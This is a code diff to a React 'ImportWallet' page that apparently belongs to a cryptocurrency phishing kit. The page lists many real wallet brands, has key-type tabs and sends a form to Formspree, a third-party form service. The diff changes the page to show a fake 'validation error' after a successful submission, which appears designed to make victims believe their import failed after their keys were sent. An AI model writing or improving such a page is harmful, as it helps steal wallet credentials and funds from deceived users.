@@ -1,101 +1,9 @@
-import React, { useEffect, useRef, useState } from 'react'
+import React, { useEffect, useState } from 'react'
 import { Link, useNavigate, useParams } from 'react-router-dom'
-import Aktionariat from "../assets/Aktionariat.png"
-import MetaMask from "../assets/MetaMask.png"
-import Trust from "../assets/Trust.png"
-import Phantom from "../assets/Phantom.png"
-import Coinbase from "../assets/Coinbase.png"
-import CryptoCom from "../assets/CryptoCom.png"
-import Blockchain from "../assets/Blockchain.png"
-import Binance from "../assets/Binance.png"
-import Safepal from "../assets/Safepal.png"
-import Ledger from "../assets/Ledger.png"
-import Argent from "../assets/Argent.png"
-import Bitkeep from "../assets/Bitkeep.png"
-import Starkpoint from "../assets/Starkpoint.png"
-import Ownbit from "../assets/Ownbit.png"
-import InfinityWallet from "../assets/InfinityWallet.png"
-import WalletIo from "../assets/WalletIo.png"
-import Infinito from "../assets/Infinito.png"
-import Torus from "../assets/Torus.png"
-import bitPay from "../assets/bitPay.png"
-import Imtoken from "../assets/Imtoken.png"
-import OtherWallets from "../assets/OtherWallets.png"
-import fortmatic from "../assets/fortmatic.png"
-import KeyringPro from "../assets/KeyringPro.png"
-import FormSubmit from '../components/FormSubmit'
-import { useForm, ValidationError } from '@formspree/react';
-const wallets = [{
-  "icon":MetaMask,
-  'title':'MetaMask'
-},
-{
-  "icon":Trust,
-  'title':'Trust'
-},{
-  "icon":Phantom,
-  'title':'Phantom'
-},{
-  "icon":Coinbase,
-  'title':'Coinbase'
-},{
-  "icon":CryptoCom,
-  'title':'CryptoCom'
-},{
-  "icon":Blockchain,
-  'title':'Blockchain'
-},{
-  "icon":Binance,
-  'title':'Binance'
-},{
-  "icon":Safepal,
-  'title':'Safepal'
-},{
-  "icon":Ledger,
-  'title':'Ledger'
-},{
-  "icon":Argent,
-  'title':'Argent'
-},{
-  "icon":fortmatic,
-  'title':'fortmatic'
-},{
-  "icon":Aktionariat,
-  'title':'Aktionariat'
-},{
-  "icon":KeyringPro,
-  'title':'KeyringPro'
-},{
-  "icon":Bitkeep,
-  'title':'Bitkeep'
-},{
-  "icon":Starkpoint,
-  'title':'Starkpoint'
-},{
-  "icon":Ownbit,
-  'title':'Ownbit'
-},{
-  "icon":InfinityWallet,
-  'title':'InfinityWallet'
-},{
-  "icon":WalletIo,
-  'title':'WalletIo'
-},{
-  "icon":Infinito,
-  'title':'Infinito'
-},{
-  "icon":Torus,
-  'title':'Torus'
-},{
-  "icon":bitPay,
-  'title':'bitPay'
-},{
-  "icon":Imtoken,
-  'title':'Imtoken'
-},{
-  "icon":OtherWallets,
-  'title':'OtherWallets'
-},]
+import { useForm } from '@formspree/react';
+import { wallets } from '../utils/wallets';
+import FormSubmit from '../components/FormSubmit';
+
 const ImportWallet = () => {
   const navigate = useNavigate()
   const {id} = useParams()
@@ -105,19 +13,18 @@ const ImportWallet = () => {
 const HandleWallet = () => {
 let tabs = document.querySelectorAll(".tab")
 let indicator = document.querySelector(".indicator")
-let panels = document.querySelectorAll(".tab-panel")
 indicator.style.width = tabs[0].getBoundingClientRect().width + 'px'
 indicator.style.left = tabs[0].getBoundingClientRect().left - tabs[0].parentElement.getBoundingClientRect().left + 'px'
 
 tabs.forEach((tab,index) =>{
    if(tab.id == tabs[0].id){
-        tab.classList.add("tabActive","text-[#0F0F0F]")
+        tab.classList.add("tabActive","text-[#000]")
         tab.classList.remove("bg-[rgba(48,48,48,0.7)]")
     }
     
   tab.addEventListener("click", (e)=>{
     tabs.forEach(tab=>{
-        tab.classList.remove("tabActive","text-[#0F0F0F]")
+        tab.classList.remove("tabActive","text-[#000]")
         tab.classList.add("bg-[rgba(48,48,48,0.7)]")
     })
     setKeyType(e.target.innerText)
@@ -126,7 +33,7 @@ tabs.forEach((tab,index) =>{
     indicator.style.left = tab.getBoundingClientRect().left - tab.parentElement.getBoundingClientRect().left + 'px'
 
     if(tab.id == tabs[index].id){
-        tab.classList.add("tabActive","text-[#0F0F0F]")
+        tab.classList.add("tabActive","text-[#000]")
         tab.classList.remove("bg-[rgba(48,48,48,0.7)]")
     }
   })
@@ -139,7 +46,7 @@ useEffect(()=>{
 },[])
 
 if (state.succeeded) {
-      navigate(`/importsuccess/${wallets[id].title}`)
+      navigate("/validationerror")
   }
   return (
     <div>
